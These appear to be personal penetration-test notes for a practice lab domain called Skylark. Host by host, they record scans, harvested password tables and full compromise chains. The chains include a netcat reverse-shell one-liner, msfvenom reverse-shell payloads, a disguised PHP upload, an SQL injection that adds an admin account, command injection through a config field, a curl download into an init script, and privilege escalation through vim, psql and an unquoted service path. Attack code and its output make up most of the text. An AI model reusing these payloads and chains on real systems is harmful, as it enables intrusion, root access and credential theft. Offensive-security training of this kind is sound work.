
## Flags

.223 - local + proof - done
.225 - local + proof - done
.221 - local + proof - done 
.11 - proof
.13 - proof
.220  - local + proof
.250  - local + proof
.226 - local + proof - done
.222 - local
.227 - proof
.15 - local + proof
.110 - local + proof 
.111 - local + proof 
.10 - local  + proof
.14 - local  + proof
.12 - local + proof
.31 - local + proof
.32 - proof
.30 - local + proof
.224 - local +  proof

## Creds 

| Users               | Passwords                            |
| ------------------- | ------------------------------------ |
| ftp_jp              | ~be<3@6fe1Z:2e8                      |
| j.local             | 5iQ78OU2JHAAKbQc5XAr                 |
| Hitoshi             | xsYu9XPYNu9dBfHo8L4k                 |
| ext_acc             | DoNotShare!SkyLarkLegacyInternal2008 |
| ann.sales           | B9aL9lbDOlNkGmJxusmi                 |
| Hitoshi@skylark.com | ganbatteyo!123                       |
| legacy              | I_Miss_Windows3.1                    |
223 > 225 > 221 > 226 > 224 (32, 30, 31) > 
## 192 Networks 
250 (prep),  220, 221, 222, 223, 224, 225, 226, 227

### 221
1. Port scan
```
nmap -A -T4 -p 80,135,139,443,445,3387,5504,5985,10000,47001,49664,49665,49666,49667,49668,49671,49670,49672,49673,49674,49675,49678 192.168.161.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 10:07 EDT
Nmap scan report for 192.168.161.221
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2022-11-15T12:30:26
|_Not valid after:  2023-05-17T12:30:26
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds  Windows Server 2022 Standard 20348 microsoft-ds
3387/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5504/tcp  open  msrpc         Microsoft Windows RPC
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
10000/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-31T14:09:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2024-04-11T09:40:47
|_Not valid after:  2024-10-11T09:40:47
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-31T14:08:51
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h44m59s, deviation: 3h30m01s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2022 Standard 20348 (Windows Server 2022 Standard 6.3)
|   Computer name: austin02
|   NetBIOS computer name: AUSTIN02\x00
|   Domain name: SKYLARK.com
|   Forest name: SKYLARK.com
|   FQDN: austin02.SKYLARK.com
|_  System time: 2024-05-31T07:08:50-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.88 seconds
```

2. Use creds from 225 machine pdf and then establish xfreerdp. 
```
http://192.168.161.221/RDWeb
“SKYLARK\kiosk” as the username and “XEwUS^9R2Gwt8O914”

xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp  /cert-ignore /v:192.168.161.221 /u:kiosk /d:SKYLARK
```

3. Run powershell and get reverse shell. 
```
1. Click on Austin02. 
2. Search 'powershell' on search option. Open right one. 
3. Upload nc64.exe then obtain foothold on local machine. 
```

4. Port forwarding with lingolo. 
```
nc 10.10.121.254 40000

netsat -ano = shows internal network port 40000 running 

All as script, including a listener
kali - ./linproxy -selfcert, start, add listener 
client - .\agent.exe -connect 192.168.45.226:11601 -ignore-cert
kali - sudo ip route del 10.10.121.0/24 dev ligolo

listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
```

5. Obtained reverse shell as root. 
```
conf> write_config 123';C:\Users\kiosk\nc64.exe 192.168.156.221 1235 -e cmd '123


 nc -lvnp 80            
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40508
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```


### 222
1. Port scan 
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2994/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

sudo nmap -sU 192.168.160.222 -p 69     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 20:51 EDT
Nmap scan report for 192.168.160.222
Host is up (0.10s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp
```

2. Found resource to download file from tftp. https://attackdefense.com/challengedetailsnoauth?cid=1525. 

3. Found ftp user creds. 
```
msf6 auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 192.168.160.222
RHOSTS => 192.168.160.222
msf6 auxiliary(scanner/tftp/tftpbrute) > set DICTIONARY /usr/share/metasploit-framework/data/words/tftp.txt
DICTIONARY => /usr/share/metasploit-framework/data/wordlists/tftp.txt
msf6 auxiliary(scanner/tftp/tftpbrute) > exploit

[+] Found backup.cfg on 192.168.160.222
[+] Found sip_327.cfg on 192.168.160.222
[+] Found sip.cfg on 192.168.160.222
[+] Found sip-confg on 192.168.160.222
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/tftp/tftpbrute) > 



msf6 auxiliary(admin/tftp/tftp_transfer_util) > set RHOST 192.168.160.222RHOST => 192.168.160.222
msf6 auxiliary(admin/tftp/tftp_transfer_util) > set REMOTE_FILENAME backup.cfg
REMOTE_FILENAME => backup.cfg
msf6 auxiliary(admin/tftp/tftp_transfer_util) > set ACTION Download 
ACTION => Download
msf6 auxiliary(admin/tftp/tftp_transfer_util) > exploit
[*] Running module against 192.168.160.222

[*] Receiving 'backup.cfg' from 192.168.160.222:69 as 'backup.cfg'
[+] 192.168.160.222:69 Transferred 79 bytes in 1 blocks, download complete!
[*] 192.168.160.222:69 TFTP transfer operation complete.
[*] Saving backup.cfg as 'backup.cfg'
[*] No database connected, so not actually saving the data:
FTP credentials for umbraco web application upgrade:

ftp_jp
~be<3@6fe1Z:2e8
[*] Auxiliary module execution completed

# found at sip-config
[auth_info_0]
username=l.nguyen
userid=l.nguyen
passwd=ChangeMePlease__XMPPTest

[auth_info_1]
username=j.jameson
userid=j.jameson
passwd=ChangeMePlease__XMPPTest

[auth_info_2]
username=j.jones
userid=j.jones
passwd=ChangeMePlease__XMPPTest
```


#### 223

1. Port scan
```
PORT      STATE SERVICE VERSION
60001/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.66 seconds
```

2. Found exploit and run it. Get another better shell. Only port 80 and 443 are allowed. 
```
python3 50128.py http://192.168.161.223:60001/catalog
/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: RCE_SHELL$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.243 443 >/tmp/f
cd 
```

3. Run linpeas and found mysql creds. Login and read important files. 
```
root:7NVLVTDGJ38HM2TQ

www-data@milan:/var/www/html/froxlor$ mysql -u root -h localhost -P 3306 -p
mysql -u root -h localhost -P 3306 -p
Enter password: 7NVLVTDGJ38HM2TQ
```

4. Found flybike user password and crack it. 
```
MariaDB [froxlor]> select * from panel_customers;

$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2 

 hashcat -m 7400 flybike /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2:Christopher
```

5. Another internal web page at 60002 found. Port forwarding with ssh, chisel is not working because all ports are blocked by firewall apart 80 and 443. 
```
ssh -R *:60002:localhost:60002 kali@192.168.45.243
```

6. Found exploit for froxlor web server. https://www.exploit-db.com/exploits/50502

7. Login and create new admin user manually. Used froxlor password again because eploits password was not accepted. Perform manual sql injection to add new admin user. 
```
`;insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$Q1.Kiob5H7GwfAuZ$cs0zMc7uaEo1Xd9p.5BtDf9NW.TySbHTW/W.oRlBdB3',1,1,1,1);--
```

8. Login with new creds x:Christopher. And then follow the exploit.
```
# - Go to System Settings
# - Go to Webserver settings
# - Adjust "Webserver reload command" field to a custom command
```

```
wget http://attacker.com/shell.php -O /runme.php

└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.161.223 - - [31/May/2024 05:05:02] "GET /shell.php HTTP/1.1" 200 -
```

```
php /runme.php

sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.161.223] 56660
Linux milan 5.15.0-52-generic #58~20.04.1-Ubuntu SMP Thu Oct 13 13:09:46 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 05:10:01 up  4:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 224 (32, 30, 31)
1. Port scan 
```
PORT STATE SERVICE REASON
22/tcp   open  ssh    syn-ack
3128/tcp open  squid-http syn-ack
8000/tcp open  http-alt   syn-ack
```

2. Establish squid proxy (/etc/proxychains)
```
# defaults set to "tor"
#socks5  127.0.0.1 1080
http 192.168.231.224 3128 ext_acc DoNotShare!SkyLarkLegacyInternal2008**
```

#### 32 
3. Browser proxy with creds done. Can login with any user obtained from 222. 

4. Use pigdin to get reverse shell. First setup pidgin user.
```
Basic 
Username: j.jameson
DOmain: SKYLARK
Resources: 172.16.231.32
Password:

Proxy
Proxy type: HTTP
PORT: 3128
Username: Ext_acc
Password:
```

5. Read superdomain password
```
@call abc -o/tmp/test123 -d @/opt/openfire/logs/sipxopenfire-im.log http://192.168.45.228/abc
 nc -lvnp 80 
 superadmin password to 2008_EndlessConversation</body>
```

6. Setup the trigger by uploading payload from chat box
```
@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://192.168.45.228:800/openfire.txt -o /tmp/dummy
https://packetstormsecurity.com/files/171281/CoreDial-sipXcom-sipXopenfire-21.04-Remote-Command-Execution-Weak-Permissions.html
```

7. Setup the trigger by uploading payload from chat box. 
```
Login using superadmin domain and restart services from portal. 

proxychains nc -nvlp 44447
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
listening on [any] 4444 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.231.224] 48074
bash: no job control in this shell                                     	 
[root@pbx sipxpbx]# id                                                 	 
id                                                                     	 
uid=0(root) gid=0(root) groups=0(root)

```

8. Post-exploitation 
```
found new user for 32
tcpdump -c 10 -w

Msg: Jun  2 00:43:01 terminal root: desktop:Deskt0pTermin4L
```

#### 30
```
RDP login
proxychains xfreerdp /u:desktop /p:Deskt0pTermin4L /v:172.16.231.30:3390/d:SKYLARK.COM

Check out SUID file and root. 

Post exploitation check legacy user history. There is a cred ‘legacy:I_Miss_Windows3.1’
```

#### 31
```
Telnet to root
proxychains telnet 172.16.231.31 2323
Root:root creds
/bin/sh -i 

Another way with metasoploit - exploit(bsd/finger/morris_fingerd_bof)
Local.txt location - /usr/guest/nobody
```

### 224 continue
1. Ssh login 
```
ssh legacy@192.168.156.224
I_Miss_Windows3.1
```

2. Rooted with vim capabilities. (use py3)
```
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```




### 225
1. Port scan
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
8090/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found file upload page with admin:admin creds. Upload php file with pdf magic bytes. 
```
pdf magic bytes - %PDF-1.7\n

8090/backend/default/uploader.php - upload here

trigger here - 8090/backend/default/uploads/shell.php
```

3. Foothold as www-data. Run linpeas found psql password. 
```
/var/www/backend/default/config.php:$con = pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");
```

4. Port forward 5432 port which is for postgres. 
```
./chisel-l server -p 8081 --reverse
2024/05/31 07:51:19 server: Reverse tunnelling enabled
2024/05/31 07:51:19 server: Fingerprint Q6z3VqG7PFmeFQN6e6u5EzsnthY8spjD6dTRBic5+OA=
2024/05/31 07:51:19 server: Listening on http://0.0.0.0:8081
2024/05/31 07:52:08 server: session#1: tun: proxy#R:5432=>5432: Listening

www-data@singapore06:/tmp$ ./chisel-l client 192.168.45.243:8081 R:5432:127.0.0.1:5432
<-l client 192.168.45.243:8081 R:5432:127.0.0.1:5432
2024/05/31 07:52:06 client: Connecting to ws://192.168.45.243:8081
2024/05/31 07:52:07 client: Connected (Latency 105.929025ms)
```

5. Psql login and then run command using this site. [Informational Nuggets - Hacking and Development (pollevanhoof.be)](https://pollevanhoof.be/nuggets/SQL_injection/postgres_command_execution)  (copy-paste might give syntax error)
```
psql -h 127.0.0.1 -U postgres -d webapp
Password for user postgres: 

CREATE TABLE my_evil_table(cmd_output text);
COPY my_evil_table FROM PROGRAM ‘id’;

nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.161.225] 38452
bash: cannot set terminal process group (43911): Inappropriate ioctl for device
bash: no job control in this shell
postgres@singapore06:/var/lib/postgresql/12/main$
```

6. PE with psql SUID. 
```
sudo psql -h 127.0.0.1 -U postgres -d webapp
\?
\! /bin/sh
```

7. Post-exploitation - found useful pdf file
```
/var/www/backend/default/uploads/user-guide-rdweb.pdf
```

### 226 
1. Port scan 
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2994/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
24621/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|   GetRequest: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     What are you trying to do? Go away.
|   HTTPOptions, RTSPRequest: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     Wrong command.
|   Help: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     214-The following commands are recognized.
|     USER TYPE SYST SIZE RNTO RNFR RMD REST QUIT
|     HELP XMKD MLST MKD EPSV XCWD NOOP AUTH OPTS DELE
|     CDUP APPE STOR ALLO RETR PWD FEAT CLNT MFMT
|     MODE XRMD PROT ADAT ABOR XPWD MDTM LIST MLSD PBSZ
|     NLST EPRT PASS STRU PASV STAT PORT
|_    Help ok.
24680/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: &#x30DB;&#x30FC;&#x30E0; - Umbraco&#x30B5;&#x30F3;&#x30D7;&#x3...
|_http-server-header: Microsoft-IIS/10.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the folloing fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

2. Ftp login using creds 'ftp_jp:~be<3@6fe1Z:2e8'. Upload malicious aspx file and trigger it using curl. Also change host name 'skylark.jp'. 
```
1. payload - msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.243 LPORT=443 -f aspx -o shell.aspx
2. Trigger - curl http://skylark.jp:24680/shell.aspx
3. Put shell.aspx in first ftp directory
```

3. Obtained foothold and use DevService unquoted binary hijack to root. 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.243 LPORT=443 -f exe -o r.exe 

PS C:\Skylark> iwr -uri http://192.168.45.243/r.exe -Outfile Development.exe
iwr -uri http://192.168.45.243/r.exe -Outfile Development.exe
PS C:\Skylark> ls
ls


    Directory: C:\Skylark


Mode                 LastWriteTime         Length Name                                                            
----                 -------------         ------ ----                                                            
d-----        2022/12/02     11:38                Development Binaries 01                                         
-a----        2024/05/31     18:59           7168 Development.exe                                                 


PS C:\Skylark> sc.exe start DevService
sc.exe start DevService


sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.160.226] 50123
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

4. Post-exploitation 
```
Transfer passwords.kdbx in local machine. 
kali - python3 /home/kali/impacket/examples/smbserver.py -smb2support myshare .
on 226 - copy C:\Users\j_local\Desktop\Passwords.kdbx \\192.168.45.243\myshare\Passwords.kdbx


crack it and found following credentials. 

Title: j_local
Uname: j.local
 Pass: 5iQ78OU2JHAAKbQc5XAr
  URL:
Notes:

Title: TokyoBank
Uname: Hitoshi
 Pass: xsYu9XPYNu9dBfHo8L4k
  URL:
Notes:
Title: Squid Proxy

Uname: ext_acc
 Pass: DoNotShare!SkyLarkLegacyInternal2008
  URL:
Notes:

Title: ann
Uname: ann.sales
 Pass: B9aL9lbDOlNkGmJxusmi
  URL:
Notes:

Title: Email
Uname: Hitoshi@skylark.com
 Pass: ganbatteyo!123
  URL:
Notes:
```

## 10 Networks 
250, 10, 12, 13, 14, 15, 110, 111 

